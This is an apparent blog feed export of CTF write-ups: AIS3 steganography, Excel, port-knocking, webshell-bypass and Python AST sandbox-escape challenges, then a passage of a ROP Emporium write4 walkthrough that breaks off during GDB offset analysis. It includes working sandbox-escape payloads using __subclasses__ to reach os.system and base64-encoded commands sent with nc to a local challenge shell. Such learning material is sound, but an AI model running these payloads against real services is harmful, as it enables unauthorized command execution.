src="https://hackmd.io/_uploads/SkV2j0ZDc.png"></p><p>找完對應後，再把 flag 轉回來<br><img src="https://hackmd.io/_uploads/BkjDs0bv9.jpg"></p><p>結果發現 Python 好像可以用 <code>maketrans()</code> 來轉換…</p><h4 id="Got-flag-我發現好像沒存到-，不過可以在筆記裡面看到"><a href="#Got-flag-我發現好像沒存到-，不過可以在筆記裡面看到" class="headerlink" title="Got flag: 我發現好像沒存到...，不過可以在筆記裡面看到"></a>Got flag: <code>我發現好像沒存到...，不過可以在筆記裡面看到</code></h4><h2 id="Misc"><a href="#Misc" class="headerlink" title="[Misc]"></a>[Misc]</h2><h3 id="Gift-in-the-dream"><a href="#Gift-in-the-dream" class="headerlink" title="Gift in the dream"></a><code>Gift in the dream</code></h3><h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><p><code>strings</code> binary 後發現 hint: <code>Qwhy is the animation lagging? why is the duration so weird? is this just a dream?</code>，猜想應該跟<code>gif</code>的時間間隔有關</p><h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format <span class="string">&quot;%s %T \n&quot;</span> gift_in_the_dream_updated.gif | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f2 | awk <span class="string">&#x27;&#123; printf(&quot;%c&quot;,$0); &#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="Result-3"><a href="#Result-3" class="headerlink" title="Result"></a>Result</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">identify -format <span class="string">&quot;%s %T \n&quot;</span> gift_in_the_dream_updated.gif | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f2 | awk <span class="string">&#x27;&#123; printf(&quot;%c&quot;,$0); &#125;&#x27;</span></span><br><span class="line">AIS3&#123;5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe&#125;%</span><br></pre></td></tr></table></figure><h4 id="Got-flag-AIS3-5T3g4n0gR4pHy-c4N-b3-fUn-s0m37iMe"><a href="#Got-flag-AIS3-5T3g4n0gR4pHy-c4N-b3-fUn-s0m37iMe" class="headerlink" title="Got flag: AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}"></a>Got flag: <code>AIS3&#123;5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe&#125;</code></h4><h3 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a><code>Excel</code></h3><p>使用 <code>binwalk</code>、<code>openpyxl</code> 解出來的結果都很怪，最後還是使用 M$ 的<code>Excel</code> 來開這個檔案</p><p>一打開就看到跳 macros<br><img src="https://hackmd.io/_uploads/rJTBe1MP5.png"></p><p>接著看到 <code>openpyxl</code>，猜官方解應該是用這個套件<br><img src="https://hackmd.io/_uploads/Hy5_xyGPc.png"></p><p>最後發現 <code>Worksheets</code> 應該有這麼多，但都沒顯示出來<br><img src="https://hackmd.io/_uploads/ryOwlyzv5.png"></p><h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><p>Google 一下怎麼顯示隱藏的 worksheets 後，在 <code>A58</code> 發現一個 Formula。執行後，在 <code>A137</code> 便可找到結果<br><img src="https://hackmd.io/_uploads/B1xDZ1zw5.png"></p><p>現在才發現原來 Excel 可以隱藏 worksheets LOL) （技能 GET）<br><img src="https://hackmd.io/_uploads/B1xDWkfw9.png"></p><h4 id="Result-4"><a href="#Result-4" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/SJlgPbyMD5.png"></p><h4 id="Got-flag-AIS3-XLM-iS-to0-o1d-but-co0o0o00olll"><a href="#Got-flag-AIS3-XLM-iS-to0-o1d-but-co0o0o00olll" class="headerlink" title="Got flag: AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}"></a>Got flag: <code>AIS3&#123;XLM_iS_to0_o1d_but_co0o0o00olll!!&#125;</code></h4><h3 id="knock"><a href="#knock" class="headerlink" title="knock"></a><code>knock</code></h3><p>先用 wireshark 錄封包，敲完後開始分析<br><code>udp &amp;&amp; ip.src==10.113.203.111 &amp;&amp; not icmp</code></p><p><img src="https://hackmd.io/_uploads/HyHu_YAq5.png"></p><p>可以看到 port number 都不同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># port.txt</span></span><br><span class="line"><span class="number">12065</span></span><br><span class="line"><span class="number">12073</span></span><br><span class="line"><span class="number">12083</span></span><br><span class="line"><span class="number">12051</span></span><br><span class="line"><span class="number">12123</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12110</span></span><br><span class="line"><span class="number">12048</span></span><br><span class="line"><span class="number">12099</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12075</span></span><br><span class="line"><span class="number">12078</span></span><br><span class="line"><span class="number">12079</span></span><br><span class="line"><span class="number">12067</span></span><br><span class="line"><span class="number">12075</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12110</span></span><br><span class="line"><span class="number">12111</span></span><br><span class="line"><span class="number">12099</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12125</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> port.txt | <span class="built_in">cut</span> -c 3-5 | awk <span class="string">&#x27;&#123;printf(&quot;%c&quot;,$1)&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cut</span></span><br><span class="line"><span class="comment"># -c list</span></span><br><span class="line"><span class="comment">#             The list specifies character positions.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># awk</span></span><br><span class="line"><span class="comment">#  An input line is normally made up of fields separated by white space, or by the regular expression FS.  The fields are denoted $1, $2, ..., while $0</span></span><br><span class="line"><span class="comment">#        refers to the entire line.  If FS is null, the input line is split into one field per character.</span></span><br><span class="line"><span class="comment">#        A pattern-action statement has the form:</span></span><br><span class="line"><span class="comment">#               pattern &#123; action &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tr -d &quot;x&quot;</span></span><br><span class="line"><span class="comment"># -d      Delete characters in string1 from the input.</span></span><br></pre></td></tr></table></figure><p><a href="https://linuxhint.com/remove_characters_string_bash/">cut</a><br><a href="https://ithelp.ithome.com.tw/articles/10136126">awk</a><br><a href="https://www.geeksforgeeks.org/printf-command-in-linux-with-examples/">printf</a><br><a href="https://www.tecmint.com/xargs-command-examples/">xargs</a></p><h4 id="Got-flag-AIS3-kn0ckKNOCKknock"><a href="#Got-flag-AIS3-kn0ckKNOCKknock" class="headerlink" title="Got flag: AIS3{kn0ckKNOCKknock}"></a>Got flag: <code>AIS3&#123;kn0ckKNOCKknock&#125;</code></h4><h3 id="seadog-webshell"><a href="#seadog-webshell" class="headerlink" title="seadog_webshell"></a>seadog_webshell</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>題目的 <code>docker-compose.yml</code>，flag 藏在環境變數，port 開在 12369，並且啟動 <a href="http://120.105.184.250/cswang/thit/Linux/XINETD.htm">xinetd</a> 當作 daemon，而這個 daemon 則呼叫了 webshell，而這個 webshell 則是短短的一個指令 <code>base64 | timeout 10s sh</code></p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker-compose.yml 裡面可以看到它 build 一個 image</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  seadog-<span class="keyword">shell</span><span class="language-bash">:</span></span><br><span class="line">    build: ./</span><br><span class="line">    volumes:</span><br><span class="line">      - ./src/webshell:/webshell:ro</span><br><span class="line">      - ./xinetd:/etc/xinetd.d/seadog-<span class="keyword">shell</span><span class="language-bash">:ro</span></span><br><span class="line">    environment:</span><br><span class="line">      FLAG: AIS3&#123;not real flag&#125;</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;12369:12369&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dockerfile</span></span><br><span class="line"><span class="keyword">FROM</span> archlinux:base</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pacman -Syyu --noconfirm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pacman -S coreutils xinetd --noconfirm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/sbin/xinetd&quot;</span>, <span class="string">&quot;-dontfork&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xinetd</span></span><br><span class="line">service seadog-<span class="keyword">shell</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&#123;</span></span><br><span class="line">    disable = no</span><br><span class="line">    type = UNLISTED</span><br><span class="line">    wait = no</span><br><span class="line">    server = /webshell</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol = tcp</span><br><span class="line">    <span class="keyword">user</span> = ctf</span><br><span class="line">    port = <span class="number">12369</span></span><br><span class="line">    flags = REUSE</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># webshell</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exec 2&gt;/dev/null</span></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">base64 | timeout <span class="number">10</span>s sh</span><br></pre></td></tr></table></figure><h4 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h4><p>想辦法繞過這個 <code>base64</code> 並取得環境變數 flag</p><p>因為 base64 的原理是每 4 個字元可以轉換成 3 個字元，所以要想辦法湊成指令，滿足</p><ol><li>字元在 base64 的索引範圍</li><li>字元數是四的倍數（可以用 &#x2F; 來湊字數）</li><li>轉換後仍可以執行 linux command</li></ol><p><img src="https://hackmd.io/_uploads/SyJvz90c5.png"></p><p><a href="https://www.wikiwand.com/zh-tw/Base64">Resources</a></p><h4 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit:"></a>Exploit:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;//bin/ls&quot;</span> | <span class="built_in">base64</span> -d | nc 127.0.0.1 12369</span><br><span class="line"></span><br><span class="line"><span class="comment"># The flag is stored in the environment variable</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/bin/env&quot;</span> | <span class="built_in">base64</span> -d | nc 127.0.0.1 12369</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/Sy2KotC99.png"></p><p><img src="https://hackmd.io/_uploads/BkJsiYAqq.png"></p><h3 id="astjail"><a href="#astjail" class="headerlink" title="astjail"></a><a href="https://chenkb91.github.io/writeup/2022/06/07/ais3-2022-writeup.html">astjail</a></h3><h4 id="Descripiton"><a href="#Descripiton" class="headerlink" title="Descripiton"></a>Descripiton</h4><p><a href="https://www.gushiciku.cn/pl/2F7p/zh-tw">Python sandbox</a> 要想辦法逃脫這個 sandbox，然後取得 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#       ...</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.Slice):</span><br><span class="line">            <span class="keyword">return</span> traverse(node.lower) <span class="keyword">and</span> traverse(node.upper)</span><br><span class="line"><span class="comment">#.      ...</span></span><br></pre></td></tr></table></figure><p>從 <a href="https://docs.python.org/3.10/library/ast.html">ast</a> 的程式碼可以看到，Slice 其實有三個參數，而上面只 traverse 了兩個（<code>step</code> 沒有被 traverse 到，因此可以拿來利用）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Slice(expr? lower, expr? upper, expr? step)</span><br></pre></td></tr></table></figure><h4 id="Exploit-6"><a href="#Exploit-6" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出 library</span></span><br><span class="line">[<span class="built_in">int</span>][::<span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__())))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># (124, &lt;class &#x27;collections.abc.Sized&#x27;&gt;), (125, &lt;class &#x27;collections.abc.Container&#x27;&gt;), (126, &lt;class &#x27;collections.abc.Callable&#x27;&gt;), (127, &lt;class &#x27;os._wrap_close&#x27;&gt;)</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># os library 在 index 127</span></span><br><span class="line">[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>][::<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">127</span>])]</span><br><span class="line"><span class="comment"># 戳出 flag</span></span><br><span class="line">[<span class="built_in">int</span>,<span class="built_in">int</span>,<span class="built_in">int</span>][::<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat ./flag.txt&#x27;</span>))]</span><br></pre></td></tr></table></figure><h4 id="Result-5"><a href="#Result-5" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/r1VSmXksq.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> AIS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>write4 rop</title>
      <link href="/2022/03/11/write4-rop/"/>
      <url>/2022/03/11/write4-rop/</url>
      
        <content type="html"><![CDATA[<p><a href="https://ropemporium.com/challenge/write4.html">challenge link</a></p><h2 id="Goal"><a href="#Goal" class="headerlink" title="Goal"></a>Goal</h2><ul><li>Manipulate writeable address and with rop we can read any file.</li></ul><p><a href="https://jeff14994.github.io/2022/03/11/write4-rop" target="_self">Read More →</a></p><span id="more"></span><p>Key points:</p><ul><li>Where to write? (e.g., The address should be writable and will not change during runtime to be a filename)</li><li>What to write? (e.g., What filename do we desire? How to concatenate the strings?)</li><li>How to make a ROP chain? (e.g., What gadget to find? In this challenge, <code>rdi</code> only consumes pointer, so how to pass the pointer to <code>rdi</code>?)</li></ul><p>My first thought:</p><ul><li>Make a symlink that points to the <code>nonexistent -&gt; flag.txt,</code> so we can get the flag easily (it will work just by calling the usefulFunction). But it turns out that it will only work locally, and if we want to solve the pwn challenge remotely, we stand no chance of changing the server’s environment.</li></ul><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><details><summary style="display:list-item">Challenge Hint</summary><blockquote><p><strong>Read&#x2F;Write</strong><br>Hopefully, you’ve realised that ROP is just a form of arbitrary code execution and if we get creative, we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge, we won’t be using built-in functionality since that’s too similar to the previous challenges, instead we’ll be looking for gadgets that let us write a value to memory such as <strong>mov [reg], reg</strong>.</p></blockquote><blockquote><p><strong>What&#x2F;Where</strong><br>Perhaps the most important thing to consider in this challenge is where we’re going to write our <strong>“flag.txt”</strong> string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose. Consider how much space each section might give you to work with and whether corrupting the information stored at these locations will cause you problems later if you need some kind of stability from this program.</p></blockquote><blockquote><p><strong>Decisions, decisions</strong><br>Once you’ve figured out how to write your string into memory and where to write it, go ahead and call <strong>print_file()</strong> with its location as its only argument. You could consider wrapping your write gadgets in helper a function; if you can write a 4 or 8 byte value to a location in memory, you could craft a function (e.g. in Python using pwntools) that takes a string and a memory location and returns a ROP chain that will write that string to your chosen location. Crafting templates like this will make your life much easier in the long run. As ever, with the MIPS challenge, don’t forget about the branch delay slot.</p></blockquote></details><h2 id="Let’s-download-the-binary"><a href="#Let’s-download-the-binary" class="headerlink" title="Let’s download the binary!"></a>Let’s download the binary!</h2><details>    <summary style="display:list-item">unzip</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ unzip -l write4.zip</span><br><span class="line">Archive:  write4.zip</span><br><span class="line">  Length      Date    Time    Name</span><br><span class="line">---------  ---------- -----   ----</span><br><span class="line">     <span class="number">8384</span>  <span class="number">2020</span><span class="number">-07</span><span class="number">-08</span> <span class="number">07</span>:<span class="number">19</span>   write4</span><br><span class="line">     <span class="number">8392</span>  <span class="number">2020</span><span class="number">-07</span><span class="number">-08</span> <span class="number">07</span>:<span class="number">19</span>   libwrite4.so</span><br><span class="line">       <span class="number">33</span>  <span class="number">2020</span><span class="number">-07</span><span class="number">-03</span> <span class="number">02</span>:<span class="number">28</span>   flag.txt</span><br><span class="line">---------                     -------</span><br><span class="line">    <span class="number">16809</span>                     <span class="number">3</span> files</span><br></pre></td></tr></table></figure></details><p>We got three files from the <code>write4.zip.</code></p><details>    <summary style="display:list-item">ldd</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ ldd write4</span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffd40583000</span>)</span><br><span class="line">        libwrite4.so =&gt; ./libwrite4.so (<span class="number">0x00007faba2c09000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007faba2a01000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007faba2e0d000</span>)</span><br></pre></td></tr></table></figure></details><p><code>write4</code> is the primary binary.<br><code>libwrite4.so</code> is the library <code>write4.</code>(we can find it out with <code>ldd</code>)<br><code>flag.txt</code> is our target filename.</p><h2 id="Static-Analysis-with-IDA-Pro"><a href="#Static-Analysis-with-IDA-Pro" class="headerlink" title="Static Analysis (with IDA Pro)"></a>Static Analysis (with IDA Pro)</h2><p>First take a look at main function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400607</span>                         ; <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">.text:0000000000400607                         public main</span><br><span class="line">.text:0000000000400607                         main proc near</span><br><span class="line">.text:0000000000400607 55                      push    rbp</span><br><span class="line">.text:0000000000400608 48 89 E5                mov     rbp, rsp</span><br><span class="line">.text:000000000040060B E8 F0 FE FF FF          call    _pwnme</span><br><span class="line">.text:0000000000400610 B8 00 00 00 00          mov     eax, 0</span><br><span class="line">.text:0000000000400615 5D                      pop     rbp</span><br><span class="line">.text:0000000000400616 C3                      retn</span><br><span class="line">.text:0000000000400616                         main endp</span><br></pre></td></tr></table></figure><details><summary style="display:list-item">external function</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.plt:<span class="number">0000000000400500</span>                         ; __int64 __fastcall <span class="title function_">pwnme</span><span class="params">(__int64, __int64, __int64)</span></span><br><span class="line">.plt:0000000000400500                         _pwnme proc near</span><br><span class="line">.plt:0000000000400500 FF 25 12 0B 20 00       jmp     cs:off_601018</span><br><span class="line">.plt:0000000000400500                         _pwnme endp</span><br></pre></td></tr></table></figure></details><p>We can see the main function is calling <code>_pwnme,</code> which is an external function in <code>libwrite4.so.</code></p><details><summary style="display:list-item">usefulFunction</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400617</span> usefulFunction  proc near</span><br><span class="line">.text:<span class="number">0000000000400617</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400618</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 mov     edi, offset aNonexistent ; <span class="string">&quot;nonexistent&quot;</span></span><br><span class="line">.text:<span class="number">0000000000400620</span>                 call    _print_file</span><br><span class="line">.text:<span class="number">0000000000400625</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000400626</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000400627</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400627</span> usefulFunction  endp</span><br></pre></td></tr></table></figure></details><p>The binary provides a <code>usefulFunction</code> which moves <code>&quot;nonexistent&quot;</code> to <code>edi</code> and calls <code>_print_file</code>. We know from calling convention that <code>edi</code> will be the first argument for <code>_print_file</code> that we can exploit. If we can change <code>&quot;nonexistent&quot;</code>  to <code>&quot;./flag.txt&quot;</code>, we will have a chance to capture the flag!</p><details><summary style="display:list-item">usefulGadgets</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 mov     [r14], r15</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062B</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040062</span>C                 align <span class="number">10</span>h</span><br></pre></td></tr></table></figure></details><p>Although it doesn’t show in the list of functions in IDA Pro, we can find it under the <code>usefulFuntion</code> in assembly mode. We will use this gadget to pass the pointer of the file name.</p><h2 id="Dynamic-Analysis-with-GDB"><a href="#Dynamic-Analysis-with-GDB" class="headerlink" title="Dynamic Analysis (with GDB)"></a>Dynamic Analysis (with GDB)</h2><p>Purpose: To find the padding before the <code>return address.</code><br>There are two ways to find the buffer size:</p><details>    <summary style="display:list-item">1. Use GDB</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. Create payload</span></span><br><span class="line">echo $(cyclic <span class="number">100</span>) &gt; payload</span><br><span class="line"><span class="comment">// 2. See from gdb to know where the binary chokes at</span></span><br><span class="line">gdb ./write4</span><br><span class="line">r &lt; payload</span><br><span class="line"><span class="comment">// Tracing buffer size in gdb</span></span><br><span class="line"><span class="number">0x007fffffffe0a8</span>│+<span class="number">0x0000</span>: <span class="string">&quot;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]&quot;</span>      ← $rsp</span><br><span class="line"><span class="number">0x007fffffffe0b0</span>│+<span class="number">0x0008</span>: <span class="string">&quot;maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0b8</span>│+<span class="number">0x0010</span>: <span class="string">&quot;oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0c0</span>│+<span class="number">0x0018</span>: <span class="string">&quot;qaaaraaasaaataaauaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0c8</span>│+<span class="number">0x0020</span>: <span class="string">&quot;saaataaauaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0d0</span>│+<span class="number">0x0028</span>: <span class="string">&quot;uaaavaaawaaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0d8</span>│+<span class="number">0x0030</span>: <span class="string">&quot;waaaxaaayaaa\n&quot;</span></span><br><span class="line"><span class="number">0x007fffffffe0e0</span>│+<span class="number">0x0038</span>: <span class="number">0x00000a61616179</span> (<span class="string">&quot;yaaa\n&quot;</span>?)</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:<span class="number">64</span> ────</span><br><span class="line">   <span class="number">0x7ffff7dc893b</span> &lt;pwnme+<span class="number">145</span>&gt;      call   <span class="number">0x7ffff7dc8730</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">   <span class="number">0x7ffff7dc8940</span> &lt;pwnme+<span class="number">150</span>&gt;      nop</span><br><span class="line">   <span class="number">0x7ffff7dc8941</span> &lt;pwnme+<span class="number">151</span>&gt;      leave</span><br><span class="line"> → <span class="number">0x7ffff7dc8942</span> &lt;pwnme+<span class="number">152</span>&gt;      ret</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#<span class="number">0</span>] Id <span class="number">1</span>, Name: <span class="string">&quot;write4&quot;</span>, stopped <span class="number">0x7ffff7dc8942</span> in <span class="title function_">pwnme</span> <span class="params">()</span>, reason: SIGSEGV</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x7ffff7dc8942 → <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/8b $rsp</span><br><span class="line">0x7fffffffe0a8: 0x6b    0x61    0x61    0x61    0x6c    0x61    0x61    0x61</span><br><span class="line"><span class="comment">// We can see directly from the $rsp and get `kaaa` for the 